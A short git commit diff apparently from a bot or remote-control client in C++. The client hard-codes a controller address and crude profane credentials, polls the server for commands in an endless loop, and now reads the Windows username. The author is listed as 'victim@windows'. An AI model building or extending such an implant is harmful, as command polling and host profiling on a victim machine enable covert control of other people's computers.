587c1a7da5cced73ebd9903d495c8faf10bc46df
utkarsh prakash <victim@windows>
2020-09-22 11:44:38 -0700

    cant use curl switch back to socket

--- client/main.cpp
+++ client/main.cpp
@@ -3,13 +3,20 @@
 #include <iostream>
 #include <chrono>
 #include <thread>
+#include <Lmcons.h>
+#include <windows.h>
 #include "bot.h"
 #include "client.h"
+
 using namespace std;
 int main(){
     Bot bot = Bot("windows", "1236", "behen", "choot", "10.0.0.14");
     cout << bot.ping_server() << endl;
     while(true){
+		char username[UNLEN+1];
+		DWORD username_len = UNLEN+1;
+		GetUserName(username, &username_len);
+		cout << username << endl;
         string cmd = bot.ping_server();
         cout << cmd << endl;
         cout << "ping" << endl;
